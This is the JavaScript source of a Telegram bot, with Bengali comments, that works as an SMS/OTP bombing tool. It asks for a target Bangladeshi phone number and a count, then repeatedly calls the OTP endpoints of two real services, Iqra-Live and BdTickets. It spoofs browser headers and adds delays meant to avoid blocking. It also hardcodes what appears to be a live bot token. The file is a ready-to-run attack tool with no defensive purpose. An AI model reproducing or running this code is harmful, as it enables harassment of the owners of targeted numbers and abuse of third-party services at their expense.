const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render/Cloud সচল রাখতে সিম্পল সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Hybrid Mode is Running!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Dual API Mode) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [[{ text: '🚀 শুরু করুন (Attack)' }], [{ text: '📢 চ্যানেল' }]],
        resize_keyboard: true
    }
};

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '/start') {
        return bot.sendMessage(chatId, "🔥 **S.R.M TELECOM ডাবল পাওয়ার**\nএখন দুটি এপিআই একসাথে কাজ করবে।", mainMenu);
    }

    if (text === '🚀 শুরু করুন (Attack)') {
        userStates[chatId] = { step: 'num' };
        return bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `🔢 **কয়টি SMS লুপ পাঠাতে চান? (১-৩০)**`);
        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 30) return bot.sendMessage(chatId, "⚠️ ১-৩০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে ডাবল এপিআই অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // ১. আপনার দেওয়া ১ম এপিআই (Iqra-Live - GET)
            try {
                await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 5000 });
                success++;
            } catch (e) {}

            // ২. আপনার দেওয়া ২য় এপিআই (BdTickets - POST)
            try {
                await axios.post('https://api.bdtickets.com:20100/v1/auth', {
                    createUserCheck: true,
                    phoneNumber: "+88" + target,
                    applicationChannel: "WEB_APP"
                }, {
                    headers: {
                        'Content-Type': 'application/json;charset=UTF-8',
                        'Origin': 'https://bdtickets.com',
                        'Referer': 'https://bdtickets.com/',
                        'Sec-Ch-Ua-Platform': '"Android"'
                    },
                    timeout: 5000
                });
                success++;
            } catch (e) {}

            // সার্ভার ব্লক এড়াতে ২.৫ সেকেন্ড গ্যাপ
            await new Promise(r => setTimeout(r, 2500));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 মোট সফল রিকোয়েস্ট: ${success}টি`, mainMenu);
    }
});
